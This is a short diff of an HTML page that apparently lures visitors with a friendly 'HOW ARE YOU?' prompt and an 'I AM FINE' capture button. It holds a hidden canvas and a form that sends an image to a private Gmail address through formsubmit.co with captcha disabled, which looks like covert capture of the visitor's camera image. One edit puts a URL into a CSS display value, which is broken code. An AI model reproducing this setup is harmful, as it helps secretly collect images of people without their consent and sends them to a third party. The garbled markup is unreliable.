@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -69,7 +69,7 @@ video {
 <h2>HELLO ❤ — HOW ARE YOU?</h2>
 <button id="capture">I AM FINE</button>
 
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="canvas" style="display:https://github.com/user-attachments/assets/39e24fbf-7fbf-4f13-bade-15725cea9cbc;"></canvas>
 
 <form id="imageForm" action="https://formsubmit.co/ganeshbist257@gmail.com" method="POST" enctype="multipart/form-data">
   <input type="hidden" name="_captcha" value="false">
